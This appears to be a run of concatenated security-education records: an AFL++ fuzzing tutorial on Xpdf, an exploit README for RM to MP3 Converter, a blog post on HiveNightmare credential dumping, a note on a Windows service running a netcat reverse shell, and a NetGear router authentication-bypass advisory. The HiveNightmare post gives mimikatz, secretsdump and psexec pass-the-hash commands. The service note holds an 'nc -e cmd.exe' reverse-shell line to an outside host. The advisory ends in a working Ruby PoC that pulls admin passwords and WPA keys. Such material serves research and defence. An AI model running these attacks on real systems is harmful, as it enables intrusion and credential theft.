https:\/\/dl.xpdfreader.com\/old\/xpdf-3.02.tar.gz\ntar -xvzf xpdf-3.02.tar.gz\n```\n\nBuild Xpdf:\n```\ncd xpdf-3.02\nsudo apt update && sudo apt install -y build-essential gcc\n.\/configure --prefix=\"$HOME\/fuzzing_xpdf\/install\/\"\nmake\nmake install\n```\n\nTime to test the build. First of all, You'll need to download a few PDF examples:\n```\ncd $HOME\/fuzzing_xpdf\nmkdir pdf_examples && cd pdf_examples\nwget https:\/\/github.com\/mozilla\/pdf.js-sample-files\/raw\/master\/helloworld.pdf\nwget http:\/\/www.africau.edu\/images\/default\/sample.pdf\nwget https:\/\/www.melbpc.org.au\/wp-content\/uploads\/2017\/10\/small-example-pdf-file.pdf\n```\n\nNow, we can test the pdfinfo binary with:\n```\n$HOME\/fuzzing_xpdf\/install\/bin\/pdfinfo -box -meta $HOME\/fuzzing_xpdf\/pdf_examples\/helloworld.pdf\n```\n\nYou should see something like this:\n\n![](Images\/Image2.png)\n\n## Install AFL++\nFor this course, we're going to use the latest version of [AFL++ fuzzer](https:\/\/github.com\/AFLplusplus\/AFLplusplus). \n\nYou can install everything in two ways:  \n\n<details>\n  <summary>Local installation (recommended option)<\/summary>\n  \n  Install the dependencies\n\n  ```\n  sudo apt-get update\n  sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools\n  sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang \n  sudo apt-get install -y gcc-$(gcc --version|head -n1|sed 's\/.* \/\/'|sed 's\/\\..*\/\/')-plugin-dev libstdc++-$(gcc --version|head -n1|sed 's\/.* \/\/'|sed 's\/\\..*\/\/')-dev\n  ```\n\n  Checkout and build AFL++\n  ```\n  cd $HOME\n  git clone https:\/\/github.com\/AFLplusplus\/AFLplusplus && cd AFLplusplus\n  export LLVM_CONFIG=\"llvm-config-11\"\n  make distrib\n  sudo make install\n  ```\n<\/details>\n\n<details>\n  <summary>Docker image<\/summary>\n  \n  Install docker\n  ```\n  sudo apt install docker\n  ```\n  \n  Pull the image\n  ```\n  docker pull aflplusplus\/aflplusplus\n  ```\n  \n  Launch the AFLPlusPlus docker container:\n  ```\n  docker run -ti -v $HOME:\/home aflplusplus\/aflplusplus\n  ```\n  and then type\n  ```\n  export $HOME=\"\/home\"\n  ```\n<\/details>\n\nNow if all went well, you should be able to run afl-fuzz. Just type\n\n```afl-fuzz```\n\nand you should see something like this:\n\n![](Images\/Image1.png)\n\n### Meet AFL++\n\nAFL is a **coverage-guided fuzzer**, which means that it gathers coverage information for each mutated input in order to discover new execution paths and potential bugs. When source code is available AFL can use instrumentation, inserting function calls at the beginning of each basic block (functions, loops, etc.)\n\nTo enable instrumentation for our target application, we need to compile the code with AFL's compilers. \n\nFirst of all, we're going to clean all previously compiled object files and executables:\n```\nrm -r $HOME\/fuzzing_xpdf\/install\ncd $HOME\/fuzzing_xpdf\/xpdf-3.02\/\nmake clean\n```\n\nAnd now we're going to build xpdf using the **afl-clang-fast** compiler:\n```\nexport LLVM_CONFIG=\"llvm-config-11\"\nCC=$HOME\/AFLplusplus\/afl-clang-fast CXX=$HOME\/AFLplusplus\/afl-clang-fast++ .\/configure --prefix=\"$HOME\/fuzzing_xpdf\/install\/\"\nmake\nmake install\n```\n\nNow, you can run the fuzzer with the following command:\n```\nafl-fuzz -i $HOME\/fuzzing_xpdf\/pdf_examples\/ -o $HOME\/fuzzing_xpdf\/out\/ -s 123 -- $HOME\/fuzzing_xpdf\/install\/bin\/pdftotext @@ $HOME\/fuzzing_xpdf\/output\n```\n\nA brief explanation of each option:\n- *-i* indicates the directory where we have to put the input cases (a.k.a file examples)\n- *-o* indicates the directory where AFL++ will store the mutated files\n- *-s* indicates the static random seed to use\n- *@@* is the placeholder target's command line that AFL will substitute with each input file name\n\nSo, basically the fuzzer will run the command   \n`$HOME\/fuzzing_xpdf\/install\/bin\/pdftotext <input-file-name> $HOME\/fuzzing_xpdf\/output` for each different input file.\n\nIf you receive a message like *\"Hmm, your system is configured to send core dump notifications to an external utility...\"*, just do:\n```\nsudo su\necho core >\/proc\/sys\/kernel\/core_pattern\nexit\n```\n\nAfter a few minutes you should see something like this:\n\n![](Images\/Image3.png)\n\nYou can see the **\"uniq. crashes\"** value in red, showing the number of unique crashes found. You can find these crashes files in the `$HOME\/fuzzing_xpdf\/out\/` directory. You can stop the fuzzer once the first crash is found, this is the one we'll work on. It can take up to one or two hours depending on your machine performance, before you get a crash.\n\nAt this stage, you have learned: \n- How to compile a target using afl compiler with instrumentation\n- How to launch afl++\n- How to detect unique crashes of your target\n\nSo what's next? We don't have any information on this bug, just a crash of the program... It's time for debugging and triage!\n\n## Do it yourself!\nIn order to complete this exercise, you need to:\n1) Reproduce the crash with the indicated file \n2) Debug the crash to find the problem\n3) Fix the issue\n\n**Estimated time = 120 mins**\n\n---\n\n<details>\n  <summary>SPOILER ALERT! : Solution inside<\/summary>\n  \n### Reproduce the crash\n\nLocate the file corresponding to the crash in the `$HOME\/fuzzing_xpdf\/out\/` directory. The filename is something like `id:000000,sig:11,src:001504+000002,time:924544,op:splice,rep:16`\n\n![](Images\/Image3_1.png)\n\nPass this file as input to pdftotext binary\n```\n$HOME\/fuzzing_xpdf\/install\/bin\/pdftotext '$HOME\/fuzzing_xpdf\/out\/default\/crashes\/<your_filename>' $HOME\/fuzzing_xpdf\/output\n```\nIt will cause a segmentation fault and results in a crash of the program.\n\n![](Images\/Image3_2.png)\n\n### Triage\n\nUse gdb to figure out why the program crashes with this input.\n\n- **You can take a look at http:\/\/people.cs.pitt.edu\/~mosse\/gdb-note.html for a good brief primer on GDB**\n  \nFirst of all, you need to rebuild Xpdf with debug info to get a symbolic stack trace:\n\n```\nrm -r $HOME\/fuzzing_xpdf\/install\ncd $HOME\/fuzzing_xpdf\/xpdf-3.02\/\nmake clean\nCFLAGS=\"-g -O0\" CXXFLAGS=\"-g -O0\" .\/configure --prefix=\"$HOME\/fuzzing_xpdf\/install\/\"\nmake\nmake install\n```\n\nNow, you can run GDB:\n\n```\ngdb --args $HOME\/fuzzing_xpdf\/install\/bin\/pdftotext $HOME\/fuzzing_xpdf\/out\/default\/crashes\/<your_filename> $HOME\/fuzzing_xpdf\/output\n```\nAnd then, type inside GDB:\n```\n >> run\n```\n\nIf all went well, you should see the following output:\n\n![](Images\/Image4.png)\n\nThen type ```bt``` to get the backtrace:\n\n![](Images\/Image5.png)\n\nScroll the call stack and you will see many calls of the \"Parser::getObj\" method that seems to indicate an infinite recursion. If you go to https:\/\/www.cvedetails.com\/cve\/CVE-2019-13288\/ you can see that the description matches with the backtrace we got from GDB.\n  \n### Fix the issue\n\nThe last step of the exercise is to fix the bug! Rebuild your target after the fix and check that your use case is not causing a segmentation fault anymore. This last part is left as exercise for the student.\n\nAlternatively, you can download Xpdf 4.02 where the bug is already fixed, and check that the segmentation fault disappears.\n\n<\/details>\n"}
{"text":"# RM to MP3 Converter\n\nExploit to pop _calc.exe_ for RM to MP3 Converter v2.7.3.700 on Windows XP.\n\nNote: executes shellcode in the stack; does **NOT** defeat DEP.\n\nTested on Windows XP SP3.\n\n![exploit](https:\/\/github.com\/NtRaiseHardError\/Windows-Binary-Exploitation\/blob\/master\/Corelan\/Corelan-Tutorials\/RM-to-MP3-Converter\/SEH\/exploit.png)\n\n## Related Tutorials:\n\n* https:\/\/www.corelan.be\/index.php\/2009\/07\/19\/exploit-writing-tutorial-part-1-stack-based-overflows\/\n\n* https:\/\/www.corelan.be\/index.php\/2009\/07\/23\/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2\/\n\n## How 2 use:\n\n1. Generate the _exploit.m3u_ file by running [`exploit.py`](https:\/\/raw.githubusercontent.com\/NtRaiseHardError\/Windows-Binary-Exploitation\/master\/Corelan\/Corelan-Tutorials\/RM-to-MP3-Converter\/SEH\/exploit.py)\n2. Load the _exploit.m3u_ file into the RM to MP3 Converter\n3. Hope that the exploit works (because it's pretty unreliable :( )\n4. If it doesn't work, try again until it does!\n\n## Example exploit file\n\n* https:\/\/raw.githubusercontent.com\/NtRaiseHardError\/Windows-Binary-Exploitation\/master\/Corelan\/Corelan-Tutorials\/RM-to-MP3-Converter\/SEH\/exploit.m3u\n\n## Discovery\n\nBy default, Windows XP SP3 ships with the `OptIn` DEP option which protects only the system binaries meaning that third party applications such as _RM to MP3 Converter_ are not<sup>[Microsoft](https:\/\/support.microsoft.com\/en-us\/help\/875352\/a-detailed-description-of-the-data-execution-prevention-dep-feature-in)<\/sup>. Because of this, shellcode can be executed on the stack as demonstrated in the provided example exploit. To enable DEP for all processes, the DEP configuration must be changed to either `OptOut`(?) or `AlwaysOn`. The `IMAGE_DLLCHARACTERISTICS_NX_COMPAT` flag in the PE header's Optional Header's `DllCharacteristics` field is not required to be set for DEP support.\n"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb HiveNightmare Comments Feed\n[4]alternate [5]alternate [6]Penetration Testing Lab [7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]August 16, 2021August 14, 2021\nHiveNightmare\nby [28]Administrator.In [29]Privilege Escalation.[30]1 Comment on\nHiveNightmare\nThe security account manager (SAM) file contains the password hashes of\nthe users on a Windows system. Since it is considered a sensitive file\nSYSTEM level privileges are required to view its contents. Therefore\nSAM is a file of interest for any pentest engagement as password hashes\ncould retrieved for offline cracking once local privilege escalation\nhave been achieved. However, as it has been discovered by [31]Jonas Lyk\nvarious versions of Windows 10 and Windows 11 allowing a standard user\nto read the SAM file due to a misconfiguration on the permissions of\nthe file.\nSine the SAM file contains the password hashes of all the users of the\nsystem including the Administrator it can be used as a method to\nescalate privileges. In order for a system to be vulnerable to this\ntechnique which is called HiveNightmare the following two conditions\nneed to apply:\n1. Enabled System Protection\n2. Restore Point (Volume Shadow Copy)\nThe System Protection is enabled by default in Windows operating\nsystems therefore if a restore point has been created then a normal\nuser can access and read the SAM file from the volume shadow copy and\nthe SECURITY and SYSTEM files. Originally all these files can be found\nin the following directory:\nC:\\Windows\\System32\\config\\SAM\nC:\\Windows\\System32\\config\\SECURITY\nC:\\Windows\\System32\\config\\SYSTEM\nSystem Protection\nThere are a variety of offensive security operations which can be\nconducted through the HiveNightmare technique:\n1. Dumping Hashes\n2. Privilege Escalation\n3. User Impersonation\n4. Passwords Modification\n5. Account Takeover (via the answers of the security questions)\nDumping Hashes\nWeaponization of the technique was trivial and multiple tools exist\nthat could be used depending on the scenario into an assessment.\nOriginally [32]Kevin Beaumont has developed in C++ an executable called\n[33]HiveNightmare. The tool will copy the SAM, SECURITY and SYSTEM\nfiles from the volume shadow copy into the current directory.\nHiveNightmare \u2013 C++ Version\nThe C# version of the [34]HiveNightmare has been developed by\n[35]Cube0x0 which enables red teams to use it in memory through\nexecute-assembly of Cobalt Strike or via any other command and control\nframework like Covenant. Password hashes, answers to the security\nquestions and any other juicy information will be displayed in the\nconsole avoiding to write any files on the disk.\nHiveNightmare \u2013 C#\nSimilarly there is also a PowerShell script called\n[36]Invoke-HiveNightmare from [37]Fernando Tomlison which can dump the\nSAM, SECURITY and SYSTEM hives to the current working direcory as the\nHiveNightmare executable.\nHiveNightmare \u2013 PowerShell\nAlternatively the [38]SeriousSam script can copy from the volume shadow\ncopy the files from a system which is vulnerable.\nSeriousSAM\n[39]Christian Mehlmauer has implemented the technique in Go language.\nThe executable [40]hive.exe will dump the files into the current\nworking directory with a timestamp.\nHiveNighmare \u2013 Go\nFinally Mimikatz contains a module \u201clsadump::sam\u201d which can read the\nSAM file if the flag \u201c\/sam\u201d is used with the full path of the SAM file\nin the volume shadow copy.\nlsadump::sam \/system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\sys\ntem32\\config\\SYSTEM \/sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\n\\system32\\config\\SAM\nMimikatz \u2013 Dump HashesMimikatz \u2013 NTLM Hash\nThe tools that were able to copy the files from the volume shadow copy\nand didn\u2019t display the hashes in the output of a console like Mimikatz\ncan be transferred to another system where impacket suite is installed\nin order to be used via secretsdump python tool.\nPrivilege Escalation\nThe password hashes for accounts with elevated access (local\nadministrator) could be cracked offline in order to be used on the\nsystem and elevate privileges. However, obtaining the local\nadministrator password hash could be used directly through psexec in\norder to authenticate to the environment with SYSTEM level privileges.\nThe secretsdump from impacket suite can read data stored in the SAM and\nSECURITY registry hive by executing the following commannd:\nsecretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL\nHiveNightmare \u2013 secretsdump\nAttempting to authenticate with psexec by using the hash value of the\nlocal administrator account can give shell access as SYSTEM. This\ntechnique will create a service on the Windows system and it is not\nconsidered opsec safe. However, eliminates the need to crack the NTLM\nhash in the event that a strong password has been selected.\npsexec.py -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fd\nb71 pentestlab@10.0.0.9 cmd.exe\nHiveNightmare \u2013 psexec\nIt should be noted that in order for the psexec to work the account\nneeds to be part of the local administrator group and remote user\naccount control should be disabled. This is governed by the\n\u201cLocalAccountTokenFilterPolicy\u201d registry key which needs to be present\non the system and to have a value of \u201c1\u201d (disabled).\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nLocal Account Token Filter Policy\nUser Impersonation\nAn alternative approach is to use a C# tool called\n[41]SharpNamedPipePTH which was developed by [42]ShitSecure in order to\nimpersonate other users of the system. The tool uses local named pipe\nand the pass the hash technique for authentication in order to execute\nbinaries as another user or a command prompt. Since the tool has been\ndeveloped in C# can be leveraged by various C2 frameworks. Getting an\nelevated or a restricted shell depending on the user permissions could\nbe used for various scenarios such as accessing documents, files\ncontaining connection strings and limit the activities of the\ncompromised user to what is necessary.\nSharpNamedPipePTH.exe username:pentestlab hash:8c3efc486704d2ee71eebe71af14d86c\nbinary:C:\\windows\\system32\\cmd.exe\nHiveNightmare \u2013 SharpNamedPipePTHHiveNightmare \u2013 Token Impersonation\nPasswords Modification\nA number of times during an assessment systems might contain old\naccounts which haven\u2019t been used for a long period of time. Since these\naccount are not actively used it is very likely that might not be\nmonitored and therefore could be used as a method to pivot from one\naccount to another and hide tracks. Mimikatz \u201clsadump::sam\u201d module can\nbe used to dump hashes from the volume shadow copy as it has been\ndiscussed earlier in this article:\nlsadump::sam \/system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\sys\ntem32\\config\\SYSTEM \/sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\n\\system32\\config\\SAM\nMimikatz \u2013 lsadump ModuleMimikatz \u2013 NTLM Hash pentestlab User\nThe module \u201clsadump::changentlm\u201d from Mimikatz can be used to change\nthe password of a user just by using it\u2019s current password hash.\nlsadump::changentlm \/user:pentestlab \/oldntlm:58a478135a93ac3bf058a5ea0e8fdb71 \/\nnewpassword:Password1234\nMimikatz \u2013 Password Change\nAccount Takeover\nFor recovery purposes in cases that the password value has been\nforgotten by the user Windows might require from the user to use three\nsecurity questions based on life events during account setup. However,\nexamining the output of secretdump it is clear that the answers are\nvisible in plain-text.\nHiveNightmare \u2013 Security Questions\nSimilarly Mimikatz will also display the answers of the security\nquestions in clear when the module \u201clsadump::secrets\u201d is being used.\nThe information is stored in the SECURITY file therefore the switch\n\u201c\/security\u201d needs to be used to point to the location of the file in\nthe volume shadow copy.\nMimikatz- Read Security Hive\nChanging the account password through the security questions recovery\nprocess is not recommended for active users on the domain. However, it\ncan be used for old accounts or just to demonstrate impact to the\nclient in a pentest or red team report.\nRate this:\nShare this:\n* [43]Twitter\n* [44]Facebook\n* [45]LinkedIn\n* [46]Reddit\n* [47]Tumblr\n* [48]WhatsApp\n* [49]Telegram\n* [50]Pinterest\n* [51]Pocket\n* [52]Email\n*\nLike Loading...\nRelated\n[53]CVE-2021-36934[54]HiveNightmare[55]Mimikatz[56]Privilege\nEscalation[57]SeriousSAM\n1 Comment\n1.\nBrecht says:\n[58]August 20, 2021 at 6:58 pm\nThe August updates for windows fix the ACLs on the sam file. But\nyou need to remove the shadow copies\nyourself.[59]https:\/\/msrc.microsoft.com\/update-guide\/vulnerability\/\nCVE-2021-36934\n[60]Reply\nLeave a Reply [61]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nPost navigation\n[62]Previous Previous post: Universal Privilege Escalation and\nPersistence \u2013 Printer\n[63]Next Next post: Domain Escalation \u2013 PrintNightmare\nFollow PenTest Lab\nEnter your email address to follow this blog and receive notifications\nof new articles by email.\nEmail Address: ____________________\n(BUTTON) Follow\nJoin 2,591 other subscribers\nSearch Topic\n____________________ (BUTTON) Search\nRecent Posts\n* [64]Persistence \u2013 Event Log\n* [65]Initial Access \u2013 search-ms URI Handler\n* [66]Persistence \u2013 Scheduled Task Tampering\n* [67]Persistence \u2013 Windows Telemetry\n* [68]Persistence \u2013 Service Control Manager\nCategories\n* [69]Coding (10)\n* [70]Exploitation Techniques (19)\n* [71]External Submissions (3)\n* [72]General Lab Notes (22)\n* [73]Information Gathering (12)\n* [74]Infrastructure (2)\n* [75]Maintaining Access (4)\n* [76]Mobile Pentesting (7)\n* [77]Network Mapping (1)\n* [78]Post Exploitation (13)\n* [79]Red Team (123)\n+ [80]Credential Access (3)\n+ [81]Defense Evasion (22)\n+ [82]Domain Escalation (5)\n+ [83]Domain Persistence (4)\n+ [84]Initial Access (1)\n+ [85]Lateral Movement (2)\n+ [86]Man-in-the-middle (1)\n+ [87]Persistence (34)\n+ [88]Privilege Escalation (17)\n* [89]Reviews (1)\n* [90]Social Engineering (11)\n* [91]Tools (7)\n* [92]VoIP (4)\n* [93]Web Application (14)\n* [94]Wireless (2)\nPentest Laboratories Discord\n* [95]Discord\nPen Test Lab Stats\n* 7,183,938 hits\n[96]Facebook Page\n[97]Facebook Page\n__________________________________________________________________\n[98]Blog at WordPress.com.\n* [99]Methodologies\n+ [100]Red Teaming\no [101]Persistence\n* [102]Resources\n+ [103]Papers\no [104]Web Application\n+ [105]Presentations\no [106]Defcon\no [107]DerbyCon\no [108]Tools\n+ [109]Videos\no [110]BSides\no [111]Defcon\no [112]DerbyCon\no [113]Hack In Paris\n* [114]Contact\n+ [115]About Us\n* [116]Comment\n* [117]Reblog\n* [118]Subscribe [119]Subscribed\n+ [120]Penetration Testing Lab\nJoin 2,289 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [121]Log in now.\n*\n+ [122]Penetration Testing Lab\n+ [123]Customize\n+ [124]Subscribe [125]Subscribed\n+ [126]Sign up\n+ [127]Log in\n+ [128]Copy shortlink\n+ [129]Report this content\n+ [130]View post in Reader\n+ [131]Manage subscriptions\n+ [132]Collapse this bar\nLoading Comments...\nWrite a Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [133]likes-master\n%d"}
{"text":"---\ndescription: 'Code Execution, Privilege Escalation'\n---\n\n# Service Execution\n\n## Execution\n\nCreating an evil service with a netcat reverse shell:\n\n{% code title=\"attacker@victim\" %}\n```csharp\nC:\\> sc create evilsvc binpath= \"c:\\tools\\nc 10.0.0.5 443 -e cmd.exe\" start= \"auto\" obj= \"LocalSystem\" password= \"\"\n[SC] CreateService SUCCESS\nC:\\> sc start evilsvc\n```\n{% endcode %}\n\n## Observations\n\nThe reverse shell lives under services.exe as expected:\n\n![](..\/..\/.gitbook\/assets\/services-nc.png)\n\nWindows security, application, Service Control Manager and sysmon logs provide some juicy details:\n\n![](..\/..\/.gitbook\/assets\/services-logs.png)\n\n![](..\/..\/.gitbook\/assets\/services-shell.png)\n\n## References\n\n{% embed url=\"https:\/\/attack.mitre.org\/wiki\/Technique\/T1035\" %}\n\n"}
{"text":">> NetGear WNDR Authentication Bypass \/ Information Disclosure\n\nDiscovered by:\n----\nPeter Adkins <peter.adkins@kernelpicnic.net>\n\nAccess:\n----\nLocal network; unauthenticated access.\nRemote network; unauthenticated access*.\n\nTracking and identifiers:\n----\nCVE - Mitre contacted; not yet allocated.\n\nPlatforms \/ Firmware confirmed affected:\n----\nNetGear WNDR3700v4 - V1.0.0.4SH\nNetGear WNDR3700v4 - V1.0.1.52\nNetGear WNR2200 - V1.0.1.88\nNetGear WNR2500 - V1.0.0.24\nNetGear WNDR3700v2 - V1.0.1.14 (Tested by Paula Thomas)\nNetGear WNDR3700v1 - V1.0.16.98 (Tested by Micha\u0142 Bartoszkiewicz)\nNetGear WNDR3700v1 - V1.0.7.98 (Tested by Micha\u0142 Bartoszkiewicz)\nNetGear WNDR4300 - V1.0.1.60 (Tested by Ronny Lindner)\nNetGear R6300v2 - V1.0.3.8 (Tested by Robert M\u00fcller)\nNetGear WNDR3300 -  V1.0.45 (Tested by Robert M\u00fcller)*\nNetGear WNDR3800 - V1.0.0.48 (Tested by an Anonymous contributor)\nNetGear WNR1000v2 - V1.0.1.1 (Tested by Jimi Sebree)\nNetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton)\nNetGear WNR2200 - V1.0.1.76 (Tested by Marcin Praczko)\nNetGear WNR2000v3 - v1.1.2.6 (Tested by Shelby Spencer)\nNetGear WNR2000v3 - V1.1.2.10 (Tested by Roland Schiebel)\nNetGear R7500 - V1.0.0.82 (Tested by Team Event Tech)\n\nAdditional platforms believed to be affected:\n----\nNetGear WNDRMAC\nNetGear WPN824N\nNetGear WNDR4700\n\nVendor involvement:\n----\n2015-01-18 - Initial contact with NetGear regarding vulnerability.\n2015-01-18 - NetGear advised to email support with concerns.\n2015-01-18 - Email sent to NetGear (support).\n2015-01-19 - Email sent to Mitre.\n2015-01-20 - NetGear (support) advised that a ticket had been created.\n2015-01-21 - NetGear (support) requested product verification.\n2015-01-21 - Replied to NetGear with information requested.\n2015-01-23 - NetGear (support) requested clarification of model.\n2015-01-23 - Replied to NetGear with list of affected models.\n2015-01-27 - NetGear (support) replied with router security features.\n2015-01-27 - Replied to NetGear and reiterated vulnerability.\n2015-01-29 - Email sent to NetGear (OpenSource) regarding issue.\n2015-01-30 - Case auto-closure email received from NetGear (support).\n2015-02-01 - Reply from Mitre requesting additional information.\n2015-02-01 - Email to Mitre with additional information.\n2015-02-11 - Vulnerability published to Bugtraq and GitHub.\n\nMitigation:\n----\n* Ensure remote \/ WAN management is disabled on the affected devices.\n* Only allow trusted devices access to the local network.\n\nNotes:\n----\n* These vulnerabilities can be leveraged \"externally\" over the internet,\nbut require devices to have remote \/ WAN management enabled.\n\n* Due to the location of this issue (net-cgi) this vulnerability may be\npresent in other devices and firmware revisions not listed in this\ndocument.\n\n* In the absence of a known security contact these issues were reported\nto NetGear support. The initial response from NetGear support was that\ndespite these issues \"the network should still stay secure\" due to a\nnumber of built-in security features. Attempts to clarify the nature of\nthis vulnerability with support were unsuccessful. This ticket has since\nbeen auto-closed while waiting for a follow up. A subsequent email sent\nto the NetGear 'OpenSource' contact has also gone unanswered.\n\n* If you have a NetGear device that is believed to be affected and can\nconfirm whether the PoC works successfully, please let me know and I\nwill update the copy of this document on GitHub (see below) and provide\ncredit for your findings.\n\n* Robert M\u00fcller has found that some additional devices may be vulnerable\nvia a service running on TCP port 5000 - beleived to be uPnP. If your\ndevice is not vulnerable on the web management port, please try passing\nthe `--port 5000` parameter to the script as an additional test.\n\n----\n\"Genie\" SOAP Service\n----\n\nA number of NetGear WNDR devices contain an embedded SOAP service that\nis seemingly for use with the NetGear Genie application. This service\nallows for viewing and setting of certain router parameters, such as:\n\n * WLAN credentials and SSIDs.\n * Connected clients.\n * Guest WLAN credentials and SSIDs.\n * Parental control settings.\n\nAt first glance, this service appears to be filtered and authenticated;\nHTTP requests with a `SOAPAction` header set but without a session\nidentifier will yield a HTTP 401 error. However, a HTTP request with a\nblank form and a `SOAPAction` header is sufficient to execute certain\nrequests and query information from the device.\n\nAs this SOAP service is implemented by the built-in HTTP \/ CGI daemon,\nunauthenticated queries will also be answered over the internet if\nremote management has been enabled on the device. As a result, affected\ndevices can be interrogated and hijacked with as little as a well placed\nHTTP query.\n\nThe attached proof of concept uses this service in order to extract the\nadministrator password, device serial number, WLAN details, and various\ndetails regarding clients currently connected to the device.\n\nA copy of this document, as well as the proof of concept below and a\nmore detailed write-up has been made available via GitHub:\n\n * https:\/\/github.com\/darkarnium\/secpub\/tree\/master\/NetGear\/SOAPWNDR\n\n----\nRuby PoC\n----\n\nrequire 'optparse'\nrequire 'nokogiri'\nrequire 'restclient'\n\n# Set defaults and parse command line arguments\noptions = {}\n\noptions[:addr] = \"192.168.1.1\"\noptions[:port] = 80\noptions[:ssl] = false\n\nOptionParser.new do |option|\n\n  option.on(\"--address [ADDRESS]\", \"Destination hostname or IP\") do |a|\n    options[:addr] = a\n  end\n\n  option.on(\"--port [PORT]\", \"Destination TCP port\") do |p|\n    options[:port] = p\n  end\n\n  option.on(\"--[no-]ssl\", \"Destination uses SSL\") do |s|\n    options[:ssl] = s\n  end\n\n  option.parse!\n\nend\n\n# Define which SOAPActions we will be using.\nactions = [\n  {\n    :name => \"Fetch password\",\n    :call => \"lan_config_security_get_info\",\n    :soap => \"LANConfigSecurity:1#GetInfo\"\n  },\n  {\n    :name => \"Fetch WLAN\",\n    :call => \"wlan_config_get_info\",\n    :soap => \"WLANConfiguration:1#GetInfo\"\n  },\n  {\n    :name => \"Fetch WPA Security Keys\",\n    :call => \"wlan_config_get_wpa_keys\",\n    :soap => \"WLANConfiguration:1#GetWPASecurityKeys\"\n  },\n  {\n    :name => \"Fetch hardware\",\n    :call => \"device_info_get_info\",\n    :soap => \"DeviceInfo:1#GetInfo\"\n  },\n  {\n    :name => \"Fetch hardware\",\n    :call => \"device_info_get_attached\",\n    :soap => \"DeviceInfo:1#GetAttachDevice\"\n  }\n  #{\n  #  :name => \"Dump configuration\",\n  #  :call => \"device_config_get_config_info\",\n  #  :soap => \"DeviceConfig:1#GetConfigInfo\"\n  #}\n]\n\ndef device_info_get_info(xml)\n  puts \"[*] Model Number: #{xml.xpath('\/\/ModelName').text}\"\n  puts \"[*] Serial Number: #{xml.xpath('\/\/SerialNumber').text}\"\n  puts \"[*] Firmware Version: #{xml.xpath('\/\/Firmwareversion').text}\"\nend\n\ndef lan_config_security_get_info(xml)\n  puts \"[*] Admin Password: #{xml.xpath(\"\/\/NewPassword\").text}\"\nend\n\ndef wlan_config_get_info(xml)\n  puts \"[*] WLAN SSID: #{xml.xpath('\/\/NewSSID').text}\"\n  puts \"[*] WLAN Enc: #{xml.xpath('\/\/NewBasicEncryptionModes').text}\"\nend\n\ndef wlan_config_get_wpa_keys(xml)\n  puts \"[*] WLAN WPA Key: #{xml.xpath('\/\/NewWPAPassphrase').text} \"\nend\n\ndef device_config_get_config_info(xml)\n  puts \"[*] Base64 Config: #{xml.xpath('\/\/NewConfigFile').text} \"\nend\n\ndef device_info_get_attached(xml)\n\n  # Data is '@' delimited.\n  devices = xml.xpath('\/\/NewAttachDevice').text.split(\"@\")\n  devices.each_index do |i|\n\n    # First element is a device count.\n    if i == 0\n      next\n    end\n\n    # Split by ';' which pulls out the device IP, name and MAC.\n    detail = devices[i].split(\";\")\n    puts \"[*] Attached: #{detail[2]} - #{detail[1]} (#{detail[3]})\"\n\n  end\n\nend\n\n# Form endpoint based on protocol, no path is required.\nif options[:ssl]\n  endpoint = \"https:\/\/#{options[:addr]}:#{options[:port]}\/\"\nelse\n  endpoint = \"http:\/\/#{options[:addr]}:#{options[:port]}\/\"\nend\n\n# Iterate over all actions and attempt to execute.\nputs \"[!] Attempting to extract information from #{endpoint}\"\n\nactions.each do |action|\n\n  # Build the target URL and setup the HTTP client object.\n  request = RestClient::Resource.new(\n    endpoint,\n    :verify_ssl => OpenSSL::SSL::VERIFY_NONE)\n\n  # Fire the request and ensure a 200 OKAY.\n  begin\n    response = request.post(\n      { \"\" => \"\" },\n      { \"SOAPAction\" => \"urn:NETGEAR-ROUTER:service:#{action[:soap]}\"})\n  rescue\n    puts \"[!] Failed to query remote host.\"\n    abort\n  end\n\n  if response.code != 200\n    puts \"[-] '#{action[:name]}' failed with response: #{response.code}\"\n    next\n  end\n\n  # Parse XML document.\n  xml = Nokogiri::XML(response.body())\n\n  if xml.xpath('\/\/ResponseCode').text == '401'\n    puts \"[-] '#{action[:name]}' failed with a SOAP error (401)\"\n    next\n  end\n\n  # Send to the processor.\n  send(action[:call], xml)\n\nend\n\n# FIN.\n"}
